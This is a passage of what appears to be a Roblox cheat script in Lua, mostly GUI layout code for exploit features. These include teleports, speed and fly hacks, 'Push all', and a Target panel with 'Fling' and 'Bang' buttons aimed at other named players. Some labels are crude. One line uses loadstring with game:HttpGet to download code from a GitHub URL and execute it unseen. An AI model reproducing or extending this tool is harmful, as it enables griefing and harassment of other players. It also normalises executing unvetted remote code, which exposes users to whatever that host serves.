LethalCannons_Button.Position = UDim2.new(0, 25, 0, 275)
LethalCannons_Button.Size = UDim2.new(0, 150, 0, 30)
LethalCannons_Button.Font = Enum.Font.Oswald
LethalCannons_Button.Text = "Lethal Cannons"
LethalCannons_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
LethalCannons_Button.TextScaled = true
LethalCannons_Button.TextSize = 14.000
LethalCannons_Button.TextWrapped = true

ChatAlert_Button.Name = "ChatAlert_Button"
ChatAlert_Button.Parent = Game_Section
ChatAlert_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
ChatAlert_Button.BackgroundTransparency = 0.500
ChatAlert_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
ChatAlert_Button.BorderSizePixel = 0
ChatAlert_Button.Position = UDim2.new(0, 210, 0, 275)
ChatAlert_Button.Size = UDim2.new(0, 150, 0, 30)
ChatAlert_Button.Font = Enum.Font.Oswald
ChatAlert_Button.Text = "Chat alert"
ChatAlert_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
ChatAlert_Button.TextScaled = true
ChatAlert_Button.TextSize = 14.000
ChatAlert_Button.TextWrapped = true

PotionDi_Button.Name = "PotionDi_Button"
PotionDi_Button.Parent = Game_Section
PotionDi_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
PotionDi_Button.BackgroundTransparency = 0.500
PotionDi_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
PotionDi_Button.BorderSizePixel = 0
PotionDi_Button.Position = UDim2.new(0, 210, 0, 125)
PotionDi_Button.Size = UDim2.new(0, 150, 0, 30)
PotionDi_Button.Font = Enum.Font.Oswald
PotionDi_Button.Text = "Potion dick"
PotionDi_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
PotionDi_Button.TextScaled = true
PotionDi_Button.TextSize = 14.000
PotionDi_Button.TextWrapped = true

VoidProtection_Button.Name = "VoidProtection_Button"
VoidProtection_Button.Parent = Game_Section
VoidProtection_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
VoidProtection_Button.BackgroundTransparency = 0.500
VoidProtection_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
VoidProtection_Button.BorderSizePixel = 0
VoidProtection_Button.Position = UDim2.new(0, 25, 0, 175)
VoidProtection_Button.Size = UDim2.new(0, 150, 0, 30)
VoidProtection_Button.Font = Enum.Font.Oswald
VoidProtection_Button.Text = "Void protection"
VoidProtection_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
VoidProtection_Button.TextScaled = true
VoidProtection_Button.TextSize = 14.000
VoidProtection_Button.TextWrapped = true

PushAll_Button.Name = "PushAll_Button"
PushAll_Button.Parent = Game_Section
PushAll_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
PushAll_Button.BackgroundTransparency = 0.500
PushAll_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
PushAll_Button.BorderSizePixel = 0
PushAll_Button.Position = UDim2.new(0, 210, 0, 225)
PushAll_Button.Size = UDim2.new(0, 150, 0, 30)
PushAll_Button.Font = Enum.Font.Oswald
PushAll_Button.Text = "Push all"
PushAll_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
PushAll_Button.TextScaled = true
PushAll_Button.TextSize = 14.000
PushAll_Button.TextWrapped = true

TouchFling_Button.Name = "TouchFling_Button"
TouchFling_Button.Parent = Game_Section
TouchFling_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
TouchFling_Button.BackgroundTransparency = 0.500
TouchFling_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
TouchFling_Button.BorderSizePixel = 0
TouchFling_Button.Position = UDim2.new(0, 25, 0, 125)
TouchFling_Button.Size = UDim2.new(0, 150, 0, 30)
TouchFling_Button.Font = Enum.Font.Oswald
TouchFling_Button.Text = "Touch fling"
TouchFling_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
TouchFling_Button.TextScaled = true
TouchFling_Button.TextSize = 14.000
TouchFling_Button.TextWrapped = true

CMDBar.Name = "CMDBar"
CMDBar.Parent = Game_Section
CMDBar.AnchorPoint = Vector2.new(0.5, 0.5)
CMDBar.BackgroundColor3 = Color3.fromRGB(0, 140, 140)
CMDBar.BackgroundTransparency = 0.300
CMDBar.BorderColor3 = Color3.fromRGB(0, 255, 255)
CMDBar.Position = UDim2.new(0.5, 0, 0, 350)
CMDBar.Size = UDim2.new(0, 275, 0, 40)
CMDBar.Font = Enum.Font.Gotham
CMDBar.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
CMDBar.PlaceholderText = "CMD BAR..."
CMDBar.Text = ""
CMDBar.TextColor3 = Color3.fromRGB(20, 20, 20)
CMDBar.TextSize = 14.000
CMDBar.TextWrapped = true

CannonTP1_Button.Name = "CannonTP1_Button"
CannonTP1_Button.Parent = Game_Section
CannonTP1_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
CannonTP1_Button.BackgroundTransparency = 0.500
CannonTP1_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
CannonTP1_Button.BorderSizePixel = 0
CannonTP1_Button.Position = UDim2.new(0, 25, 0, 400)
CannonTP1_Button.Size = UDim2.new(0, 150, 0, 30)
CannonTP1_Button.Font = Enum.Font.Oswald
CannonTP1_Button.Text = "TP Cannon 1"
CannonTP1_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
CannonTP1_Button.TextScaled = true
CannonTP1_Button.TextSize = 14.000
CannonTP1_Button.TextWrapped = true

CannonTP2_Button.Name = "CannonTP2_Button"
CannonTP2_Button.Parent = Game_Section
CannonTP2_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
CannonTP2_Button.BackgroundTransparency = 0.500
CannonTP2_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
CannonTP2_Button.BorderSizePixel = 0
CannonTP2_Button.Position = UDim2.new(0, 210, 0, 400)
CannonTP2_Button.Size = UDim2.new(0, 150, 0, 30)
CannonTP2_Button.Font = Enum.Font.Oswald
CannonTP2_Button.Text = "TP Cannon 2"
CannonTP2_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
CannonTP2_Button.TextScaled = true
CannonTP2_Button.TextSize = 14.000
CannonTP2_Button.TextWrapped = true

CannonTP3_Button.Name = "CannonTP3_Button"
CannonTP3_Button.Parent = Game_Section
CannonTP3_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
CannonTP3_Button.BackgroundTransparency = 0.500
CannonTP3_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
CannonTP3_Button.BorderSizePixel = 0
CannonTP3_Button.Position = UDim2.new(0, 25, 0, 450)
CannonTP3_Button.Size = UDim2.new(0, 150, 0, 30)
CannonTP3_Button.Font = Enum.Font.Oswald
CannonTP3_Button.Text = "TP Cannon 3"
CannonTP3_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
CannonTP3_Button.TextScaled = true
CannonTP3_Button.TextSize = 14.000
CannonTP3_Button.TextWrapped = true

MinefieldTP_Button.Name = "MinefieldTP_Button"
MinefieldTP_Button.Parent = Game_Section
MinefieldTP_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
MinefieldTP_Button.BackgroundTransparency = 0.500
MinefieldTP_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
MinefieldTP_Button.BorderSizePixel = 0
MinefieldTP_Button.Position = UDim2.new(0, 210, 0, 450)
MinefieldTP_Button.Size = UDim2.new(0, 150, 0, 30)
MinefieldTP_Button.Font = Enum.Font.Oswald
MinefieldTP_Button.Text = "TP Minefield"
MinefieldTP_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
MinefieldTP_Button.TextScaled = true
MinefieldTP_Button.TextSize = 14.000
MinefieldTP_Button.TextWrapped = true

BallonTP_Button.Name = "BallonTP_Button"
BallonTP_Button.Parent = Game_Section
BallonTP_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
BallonTP_Button.BackgroundTransparency = 0.500
BallonTP_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
BallonTP_Button.BorderSizePixel = 0
BallonTP_Button.Position = UDim2.new(0, 25, 0, 500)
BallonTP_Button.Size = UDim2.new(0, 150, 0, 30)
BallonTP_Button.Font = Enum.Font.Oswald
BallonTP_Button.Text = "TP Ballon"
BallonTP_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
BallonTP_Button.TextScaled = true
BallonTP_Button.TextSize = 14.000
BallonTP_Button.TextWrapped = true

NormalStairsTP_Button.Name = "NormalStairsTP_Button"
NormalStairsTP_Button.Parent = Game_Section
NormalStairsTP_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
NormalStairsTP_Button.BackgroundTransparency = 0.500
NormalStairsTP_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
NormalStairsTP_Button.BorderSizePixel = 0
NormalStairsTP_Button.Position = UDim2.new(0, 210, 0, 500)
NormalStairsTP_Button.Size = UDim2.new(0, 150, 0, 30)
NormalStairsTP_Button.Font = Enum.Font.Oswald
NormalStairsTP_Button.Text = "TP Stairs"
NormalStairsTP_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
NormalStairsTP_Button.TextScaled = true
NormalStairsTP_Button.TextSize = 14.000
NormalStairsTP_Button.TextWrapped = true

MovingStairsTP_Button.Name = "MovingStairsTP_Button"
MovingStairsTP_Button.Parent = Game_Section
MovingStairsTP_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
MovingStairsTP_Button.BackgroundTransparency = 0.500
MovingStairsTP_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
MovingStairsTP_Button.BorderSizePixel = 0
MovingStairsTP_Button.Position = UDim2.new(0, 25, 0, 550)
MovingStairsTP_Button.Size = UDim2.new(0, 150, 0, 30)
MovingStairsTP_Button.Font = Enum.Font.Oswald
MovingStairsTP_Button.Text = "TP Moving Stairs"
MovingStairsTP_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
MovingStairsTP_Button.TextScaled = true
MovingStairsTP_Button.TextSize = 14.000
MovingStairsTP_Button.TextWrapped = true

SpiralStairsTP_Button.Name = "SpiralStairsTP_Button"
SpiralStairsTP_Button.Parent = Game_Section
SpiralStairsTP_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
SpiralStairsTP_Button.BackgroundTransparency = 0.500
SpiralStairsTP_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
SpiralStairsTP_Button.BorderSizePixel = 0
SpiralStairsTP_Button.Position = UDim2.new(0, 210, 0, 550)
SpiralStairsTP_Button.Size = UDim2.new(0, 150, 0, 30)
SpiralStairsTP_Button.Font = Enum.Font.Oswald
SpiralStairsTP_Button.Text = "TP Spiral Stairs"
SpiralStairsTP_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
SpiralStairsTP_Button.TextScaled = true
SpiralStairsTP_Button.TextSize = 14.000
SpiralStairsTP_Button.TextWrapped = true

SkyscraperTP_Button.Name = "SkyscraperTP_Button"
SkyscraperTP_Button.Parent = Game_Section
SkyscraperTP_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
SkyscraperTP_Button.BackgroundTransparency = 0.500
SkyscraperTP_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
SkyscraperTP_Button.BorderSizePixel = 0
SkyscraperTP_Button.Position = UDim2.new(0, 25, 0, 600)
SkyscraperTP_Button.Size = UDim2.new(0, 150, 0, 30)
SkyscraperTP_Button.Font = Enum.Font.Oswald
SkyscraperTP_Button.Text = "TP Skyscraper"
SkyscraperTP_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
SkyscraperTP_Button.TextScaled = true
SkyscraperTP_Button.TextSize = 14.000
SkyscraperTP_Button.TextWrapped = true

PoolTP_Button.Name = "PoolTP_Button"
PoolTP_Button.Parent = Game_Section
PoolTP_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
PoolTP_Button.BackgroundTransparency = 0.500
PoolTP_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
PoolTP_Button.BorderSizePixel = 0
PoolTP_Button.Position = UDim2.new(0, 210, 0, 600)
PoolTP_Button.Size = UDim2.new(0, 150, 0, 30)
PoolTP_Button.Font = Enum.Font.Oswald
PoolTP_Button.Text = "TP Pool"
PoolTP_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
PoolTP_Button.TextScaled = true
PoolTP_Button.TextSize = 14.000
PoolTP_Button.TextWrapped = true

FreePushTool_Button.Name = "FreePushTool_Button"
FreePushTool_Button.Parent = Game_Section
FreePushTool_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
FreePushTool_Button.BackgroundTransparency = 0.500
FreePushTool_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
FreePushTool_Button.BorderSizePixel = 0
FreePushTool_Button.Position = UDim2.new(0, 210, 0, 175)
FreePushTool_Button.Size = UDim2.new(0, 150, 0, 30)
FreePushTool_Button.Font = Enum.Font.Oswald
FreePushTool_Button.Text = "Modded push"
FreePushTool_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
FreePushTool_Button.TextScaled = true
FreePushTool_Button.TextSize = 14.000
FreePushTool_Button.TextWrapped = true

Home_Section.Name = "Home_Section"
Home_Section.Parent = Background
Home_Section.Active = true
Home_Section.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Home_Section.BackgroundTransparency = 1.000
Home_Section.BorderColor3 = Color3.fromRGB(0, 0, 0)
Home_Section.BorderSizePixel = 0
Home_Section.Position = UDim2.new(0, 105, 0, 30)
Home_Section.Size = UDim2.new(0, 395, 0, 320)
Home_Section.CanvasSize = UDim2.new(0, 0, 0, 0)
Home_Section.ScrollBarThickness = 5

Profile_Image.Name = "Profile_Image"
Profile_Image.Parent = Home_Section
Profile_Image.BackgroundColor3 = Color3.fromRGB(30,30,30)
Profile_Image.BorderColor3 = Color3.fromRGB(0, 0, 0)
Profile_Image.BorderSizePixel = 0
Profile_Image.Position = UDim2.new(0, 25, 0, 25)
Profile_Image.Size = UDim2.new(0, 100, 0, 100)
Profile_Image.Image = Players:GetUserThumbnailAsync(plr.UserId,Enum.ThumbnailType.HeadShot,Enum.ThumbnailSize.Size420x420)

Welcome_Label.Name = "Welcome_Label"
Welcome_Label.Parent = Home_Section
Welcome_Label.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Welcome_Label.BackgroundTransparency = 1.000
Welcome_Label.BorderColor3 = Color3.fromRGB(0, 0, 0)
Welcome_Label.BorderSizePixel = 0
Welcome_Label.Position = UDim2.new(0, 150, 0, 25)
Welcome_Label.Size = UDim2.new(0, 200, 0, 100)
Welcome_Label.Font = Enum.Font.SourceSans
Welcome_Label.Text = ("¡Hello @"..plr.Name.."!\nPress [B] to open/close gui.")
Welcome_Label.TextColor3 = Color3.fromRGB(0, 255, 255)
Welcome_Label.TextSize = 24.000
Welcome_Label.TextWrapped = true
Welcome_Label.TextXAlignment = Enum.TextXAlignment.Left
Welcome_Label.TextYAlignment = Enum.TextYAlignment.Top

Announce_Label.Name = "Announce_Label"
Announce_Label.Parent = Home_Section
Announce_Label.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Announce_Label.BorderColor3 = Color3.fromRGB(0, 0, 0)
Announce_Label.BorderSizePixel = 0
Announce_Label.Position = UDim2.new(0, 25, 0, 150)
Announce_Label.Size = UDim2.new(0, 350, 0, 150)
Announce_Label.Font = Enum.Font.SourceSans
Announce_Label.Text = loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/announce"))()
Announce_Label.TextColor3 = Color3.fromRGB(0, 255, 255)
Announce_Label.TextSize = 24.000
Announce_Label.TextWrapped = true
Announce_Label.TextXAlignment = Enum.TextXAlignment.Left
Announce_Label.TextYAlignment = Enum.TextYAlignment.Top

Character_Section.Name = "Character_Section"
Character_Section.Parent = Background
Character_Section.Active = true
Character_Section.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Character_Section.BackgroundTransparency = 1.000
Character_Section.BorderColor3 = Color3.fromRGB(0, 0, 0)
Character_Section.BorderSizePixel = 0
Character_Section.Position = UDim2.new(0, 105, 0, 30)
Character_Section.Size = UDim2.new(0, 395, 0, 320)
Character_Section.Visible = false
Character_Section.CanvasSize = UDim2.new(0, 0, 1, 0)
Character_Section.ScrollBarThickness = 5

WalkSpeed_Button.Name = "WalkSpeed_Button"
WalkSpeed_Button.Parent = Character_Section
WalkSpeed_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
WalkSpeed_Button.BackgroundTransparency = 0.500
WalkSpeed_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
WalkSpeed_Button.BorderSizePixel = 0
WalkSpeed_Button.Position = UDim2.new(0, 25, 0, 25)
WalkSpeed_Button.Size = UDim2.new(0, 150, 0, 30)
WalkSpeed_Button.Font = Enum.Font.Oswald
WalkSpeed_Button.Text = "Walk Speed"
WalkSpeed_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
WalkSpeed_Button.TextScaled = true
WalkSpeed_Button.TextSize = 14.000
WalkSpeed_Button.TextWrapped = true

WalkSpeed_Input.Name = "WalkSpeed_Input"
WalkSpeed_Input.Parent = Character_Section
WalkSpeed_Input.BackgroundColor3 = Color3.fromRGB(0, 140, 140)
WalkSpeed_Input.BackgroundTransparency = 0.300
WalkSpeed_Input.BorderColor3 = Color3.fromRGB(0, 255, 255)
WalkSpeed_Input.Position = UDim2.new(0, 210, 0, 25)
WalkSpeed_Input.Size = UDim2.new(0, 175, 0, 30)
WalkSpeed_Input.Font = Enum.Font.Gotham
WalkSpeed_Input.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
WalkSpeed_Input.PlaceholderText = "Number [1-99999]"
WalkSpeed_Input.Text = ""
WalkSpeed_Input.TextColor3 = Color3.fromRGB(20, 20, 20)
WalkSpeed_Input.TextSize = 14.000
WalkSpeed_Input.TextWrapped = true

ClearCheckpoint_Button.Name = "ClearCheckpoint_Button"
ClearCheckpoint_Button.Parent = Character_Section
ClearCheckpoint_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
ClearCheckpoint_Button.BackgroundTransparency = 0.500
ClearCheckpoint_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
ClearCheckpoint_Button.BorderSizePixel = 0
ClearCheckpoint_Button.Position = UDim2.new(0, 210, 0, 225)
ClearCheckpoint_Button.Size = UDim2.new(0, 150, 0, 30)
ClearCheckpoint_Button.Font = Enum.Font.Oswald
ClearCheckpoint_Button.Text = "Clear checkpoint"
ClearCheckpoint_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
ClearCheckpoint_Button.TextScaled = true
ClearCheckpoint_Button.TextSize = 14.000
ClearCheckpoint_Button.TextWrapped = true

JumpPower_Input.Name = "JumpPower_Input"
JumpPower_Input.Parent = Character_Section
JumpPower_Input.BackgroundColor3 = Color3.fromRGB(0, 140, 140)
JumpPower_Input.BackgroundTransparency = 0.300
JumpPower_Input.BorderColor3 = Color3.fromRGB(0, 255, 255)
JumpPower_Input.Position = UDim2.new(0, 210, 0, 75)
JumpPower_Input.Size = UDim2.new(0, 175, 0, 30)
JumpPower_Input.Font = Enum.Font.Gotham
JumpPower_Input.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
JumpPower_Input.PlaceholderText = "Number [1-99999]"
JumpPower_Input.Text = ""
JumpPower_Input.TextColor3 = Color3.fromRGB(20, 20, 20)
JumpPower_Input.TextSize = 14.000
JumpPower_Input.TextWrapped = true

JumpPower_Button.Name = "JumpPower_Button"
JumpPower_Button.Parent = Character_Section
JumpPower_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
JumpPower_Button.BackgroundTransparency = 0.500
JumpPower_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
JumpPower_Button.BorderSizePixel = 0
JumpPower_Button.Position = UDim2.new(0, 25, 0, 75)
JumpPower_Button.Size = UDim2.new(0, 150, 0, 30)
JumpPower_Button.Font = Enum.Font.Oswald
JumpPower_Button.Text = "Jump power"
JumpPower_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
JumpPower_Button.TextScaled = true
JumpPower_Button.TextSize = 14.000
JumpPower_Button.TextWrapped = true

SaveCheckpoint_Button.Name = "SaveCheckpoint_Button"
SaveCheckpoint_Button.Parent = Character_Section
SaveCheckpoint_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
SaveCheckpoint_Button.BackgroundTransparency = 0.500
SaveCheckpoint_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
SaveCheckpoint_Button.BorderSizePixel = 0
SaveCheckpoint_Button.Position = UDim2.new(0, 210, 0, 175)
SaveCheckpoint_Button.Size = UDim2.new(0, 150, 0, 30)
SaveCheckpoint_Button.Font = Enum.Font.Oswald
SaveCheckpoint_Button.Text = "Save checkpoint"
SaveCheckpoint_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
SaveCheckpoint_Button.TextScaled = true
SaveCheckpoint_Button.TextSize = 14.000
SaveCheckpoint_Button.TextWrapped = true

Respawn_Button.Name = "Respawn_Button"
Respawn_Button.Parent = Character_Section
Respawn_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Respawn_Button.BackgroundTransparency = 0.500
Respawn_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Respawn_Button.BorderSizePixel = 0
Respawn_Button.Position = UDim2.new(0, 25, 0, 225)
Respawn_Button.Size = UDim2.new(0, 150, 0, 30)
Respawn_Button.Font = Enum.Font.Oswald
Respawn_Button.Text = "Respawn"
Respawn_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Respawn_Button.TextScaled = true
Respawn_Button.TextSize = 14.000
Respawn_Button.TextWrapped = true

FlySpeed_Button.Name = "FlySpeed_Button"
FlySpeed_Button.Parent = Character_Section
FlySpeed_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
FlySpeed_Button.BackgroundTransparency = 0.500
FlySpeed_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
FlySpeed_Button.BorderSizePixel = 0
FlySpeed_Button.Position = UDim2.new(0, 25, 0, 125)
FlySpeed_Button.Size = UDim2.new(0, 150, 0, 30)
FlySpeed_Button.Font = Enum.Font.Oswald
FlySpeed_Button.Text = "Fly speed"
FlySpeed_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
FlySpeed_Button.TextScaled = true
FlySpeed_Button.TextSize = 14.000
FlySpeed_Button.TextWrapped = true

FlySpeed_Input.Name = "FlySpeed_Input"
FlySpeed_Input.Parent = Character_Section
FlySpeed_Input.BackgroundColor3 = Color3.fromRGB(0, 140, 140)
FlySpeed_Input.BackgroundTransparency = 0.300
FlySpeed_Input.BorderColor3 = Color3.fromRGB(0, 255, 255)
FlySpeed_Input.Position = UDim2.new(0, 210, 0, 125)
FlySpeed_Input.Size = UDim2.new(0, 175, 0, 30)
FlySpeed_Input.Font = Enum.Font.Gotham
FlySpeed_Input.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
FlySpeed_Input.PlaceholderText = "Number [1-99999]"
FlySpeed_Input.Text = ""
FlySpeed_Input.TextColor3 = Color3.fromRGB(20, 20, 20)
FlySpeed_Input.TextSize = 14.000
FlySpeed_Input.TextWrapped = true

Fly_Button.Name = "Fly_Button"
Fly_Button.Parent = Character_Section
Fly_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Fly_Button.BackgroundTransparency = 0.500
Fly_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Fly_Button.BorderSizePixel = 0
Fly_Button.Position = UDim2.new(0, 25, 0, 175)
Fly_Button.Size = UDim2.new(0, 150, 0, 30)
Fly_Button.Font = Enum.Font.Oswald
Fly_Button.Text = "Fly"
Fly_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Fly_Button.TextScaled = true
Fly_Button.TextSize = 14.000
Fly_Button.TextWrapped = true

Target_Section.Name = "Target_Section"
Target_Section.Parent = Background
Target_Section.Active = true
Target_Section.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Target_Section.BackgroundTransparency = 1.000
Target_Section.BorderColor3 = Color3.fromRGB(0, 0, 0)
Target_Section.BorderSizePixel = 0
Target_Section.Position = UDim2.new(0, 105, 0, 30)
Target_Section.Size = UDim2.new(0, 395, 0, 320)
Target_Section.Visible = false
Target_Section.CanvasSize = UDim2.new(0, 0, 1.25, 0)
Target_Section.ScrollBarThickness = 5

TargetImage.Name = "TargetImage"
TargetImage.Parent = Target_Section
TargetImage.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
TargetImage.BorderColor3 = Color3.fromRGB(0, 255, 255)
TargetImage.Position = UDim2.new(0, 25, 0, 25)
TargetImage.Size = UDim2.new(0, 100, 0, 100)
TargetImage.Image = "rbxassetid://10818605405"

TargetName_Input.Name = "TargetName_Input"
TargetName_Input.Parent = Target_Section
TargetName_Input.BackgroundColor3 = Color3.fromRGB(0, 140, 140)
TargetName_Input.BackgroundTransparency = 0.300
TargetName_Input.BorderColor3 = Color3.fromRGB(0, 255, 255)
TargetName_Input.Position = UDim2.new(0, 150, 0, 30)
TargetName_Input.Size = UDim2.new(0, 175, 0, 30)
TargetName_Input.Font = Enum.Font.Gotham
TargetName_Input.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
TargetName_Input.PlaceholderText = "@target..."
TargetName_Input.Text = ""
TargetName_Input.TextColor3 = Color3.fromRGB(20, 20, 20)
TargetName_Input.TextSize = 14.000
TargetName_Input.TextWrapped = true

ClickTargetTool_Button.Name = "ClickTargetTool_Button"
ClickTargetTool_Button.Parent = TargetName_Input
ClickTargetTool_Button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ClickTargetTool_Button.BackgroundTransparency = 1.000
ClickTargetTool_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
ClickTargetTool_Button.BorderSizePixel = 0
ClickTargetTool_Button.Position = UDim2.new(0, 180, 0, 0)
ClickTargetTool_Button.Size = UDim2.new(0, 30, 0, 30)
ClickTargetTool_Button.Image = "rbxassetid://2716591855"

UserIDTargetLabel.Name = "UserIDTargetLabel"
UserIDTargetLabel.Parent = Target_Section
UserIDTargetLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
UserIDTargetLabel.BackgroundTransparency = 1.000
UserIDTargetLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
UserIDTargetLabel.BorderSizePixel = 0
UserIDTargetLabel.Position = UDim2.new(0, 150, 0, 70)
UserIDTargetLabel.Size = UDim2.new(0, 300, 0, 75)
UserIDTargetLabel.Font = Enum.Font.Oswald
UserIDTargetLabel.Text = "UserID: \nDisplay: \nJoined: "
UserIDTargetLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
UserIDTargetLabel.TextSize = 18.000
UserIDTargetLabel.TextWrapped = true
UserIDTargetLabel.TextXAlignment = Enum.TextXAlignment.Left
UserIDTargetLabel.TextYAlignment = Enum.TextYAlignment.Top

ViewTarget_Button.Name = "ViewTarget_Button"
ViewTarget_Button.Parent = Target_Section
ViewTarget_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
ViewTarget_Button.BackgroundTransparency = 0.500
ViewTarget_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
ViewTarget_Button.BorderSizePixel = 0
ViewTarget_Button.Position = UDim2.new(0, 210, 0, 150)
ViewTarget_Button.Size = UDim2.new(0, 150, 0, 30)
ViewTarget_Button.Font = Enum.Font.Oswald
ViewTarget_Button.Text = "View"
ViewTarget_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
ViewTarget_Button.TextScaled = true
ViewTarget_Button.TextSize = 14.000
ViewTarget_Button.TextWrapped = true

FlingTarget_Button.Name = "FlingTarget_Button"
FlingTarget_Button.Parent = Target_Section
FlingTarget_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
FlingTarget_Button.BackgroundTransparency = 0.500
FlingTarget_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
FlingTarget_Button.BorderSizePixel = 0
FlingTarget_Button.Position = UDim2.new(0, 25, 0, 150)
FlingTarget_Button.Size = UDim2.new(0, 150, 0, 30)
FlingTarget_Button.Font = Enum.Font.Oswald
FlingTarget_Button.Text = "Fling"
FlingTarget_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
FlingTarget_Button.TextScaled = true
FlingTarget_Button.TextSize = 14.000
FlingTarget_Button.TextWrapped = true

FocusTarget_Button.Name = "FocusTarget_Button"
FocusTarget_Button.Parent = Target_Section
FocusTarget_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
FocusTarget_Button.BackgroundTransparency = 0.500
FocusTarget_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
FocusTarget_Button.BorderSizePixel = 0
FocusTarget_Button.Position = UDim2.new(0, 25, 0, 200)
FocusTarget_Button.Size = UDim2.new(0, 150, 0, 30)
FocusTarget_Button.Font = Enum.Font.Oswald
FocusTarget_Button.Text = "Focus"
FocusTarget_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
FocusTarget_Button.TextScaled = true
FocusTarget_Button.TextSize = 14.000
FocusTarget_Button.TextWrapped = true

BenxTarget_Button.Name = "BenxTarget_Button"
BenxTarget_Button.Parent = Target_Section
BenxTarget_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
BenxTarget_Button.BackgroundTransparency = 0.500
BenxTarget_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
BenxTarget_Button.BorderSizePixel = 0
BenxTarget_Button.Position = UDim2.new(0, 210, 0, 200)
BenxTarget_Button.Size = UDim2.new(0, 150, 0, 30)
BenxTarget_Button.Font = Enum.Font.Oswald
BenxTarget_Button.Text = "Bang"
BenxTarget_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
BenxTarget_Button.TextScaled = true
BenxTarget_Button.TextSize = 14.000
BenxTarget_Button.TextWrapped = true

